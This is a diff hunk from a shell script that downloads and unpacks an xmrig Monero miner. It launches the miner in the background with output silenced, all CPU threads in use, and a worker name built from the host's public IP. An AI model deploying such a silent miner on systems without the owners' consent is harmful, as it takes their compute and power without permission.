@@ -91,7 +91,9 @@ wget https://github.com/shoguncao/CDN/raw/xmrig/xmrig/xmrig-personal-shoguncao-6
 tar -xvf xmrig-personal-shoguncao-6.21.1.tar.gz
 pushd ~/shou_gang_working_space/xmrig-personal-shoguncao-6.21.1
 rm -rf ./xmrig.log
-./xmrig --url ${monero_node} --proxy 127.0.0.1:10800 --tls --user ${user_tag}.$(curl ipinfo.io/ip) --threads $(nproc) --log-file ./xmrig.log 1>/dev/null 2>/dev/null &
+ip=$(curl ipinfo.io/ip)
+user="${user_tag}_${ip//\./_}"
+./xmrig --url ${monero_node} --proxy 127.0.0.1:10800 --tls --user ${user} --threads $(nproc) --log-file ./xmrig.log 1>/dev/null 2>/dev/null &
 popd
 popd
 
